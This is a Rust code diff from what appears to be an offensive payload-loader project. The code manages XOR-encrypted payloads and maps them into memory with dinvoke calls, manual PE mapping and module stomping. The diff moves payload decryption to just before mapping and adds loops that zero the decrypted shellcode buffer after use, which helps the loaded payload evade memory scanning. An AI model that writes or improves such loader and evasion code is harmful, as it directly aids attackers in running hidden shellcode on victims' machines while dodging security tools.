@@ -135,12 +135,10 @@ impl Manager {
                 {   
                     let payload = self.payloads.get(&address).unwrap();
                     let key = *self.keys.get(&address).unwrap();
-                    let decrypted_payload = Manager::xor_module(payload.to_vec(), key);
                     let pe_info = self.payloads_metadata.get(&address).unwrap();
                     let decoy_info = self.decoys_metadata.get(&address).unwrap();
-
+                    
                     let addr: PVOID = std::mem::transmute(address);
-
                     let handle = HANDLE {0: -1};
                     let base_address: *mut PVOID = std::mem::transmute(&address);
                     let s: UnsafeCell<i64> = i64::default().into();
@@ -158,6 +156,7 @@ impl Manager {
 
                     let old_protection: *mut u32 = std::mem::transmute(&u32::default());
                     let ret = dinvoke::nt_protect_virtual_memory(handle, base_address, size, PAGE_READWRITE, old_protection);
+                    
 
                     if ret != 0
                     {
@@ -165,8 +164,14 @@ impl Manager {
                     }
 
                     dinvoke::rtl_zero_memory(*base_address, *size);
-
+                    let mut decrypted_payload = Manager::xor_module(payload.to_vec(), key);
                     let _r = manualmap::map_to_allocated_memory(decrypted_payload.as_ptr(), addr, pe_info)?;
+                    let decrypted_payload_ptr = decrypted_payload.as_mut_ptr();
+                    
+                    for i in 0..decrypted_payload.len()
+                    {
+                        *(decrypted_payload_ptr.add(i)) = 0u8;
+                    }
                 } 
 
                 self.counter.insert(address, self.counter[&address] + 1);
@@ -258,7 +263,7 @@ impl Manager {
         
     }
 
-    pub fn stomp_shellcode (&mut self, address: isize) -> Result<(),String>
+    pub fn stomp_shellcode(&mut self, address: isize) -> Result<(),String>
     {
         if self.payloads.contains_key(&address)
         {
@@ -266,8 +271,16 @@ impl Manager {
             {   
                 let payload = self.payloads.get(&address).unwrap();
                 let key = *self.keys.get(&address).unwrap();
-                let decrypted_payload = Manager::xor_module(payload.to_vec(), key);
+                let mut decrypted_payload = Manager::xor_module(payload.to_vec(), key);
                 let result = overload::managed_module_stomping(&decrypted_payload, address, 0);
+                let decrypted_payload_ptr = decrypted_payload.as_mut_ptr();
+                unsafe
+                {
+                    for i in 0..decrypted_payload.len()
+                    {
+                        *(decrypted_payload_ptr.add(i)) = 0u8;
+                    }
+                }
 
                 if !result.is_ok()
                 {
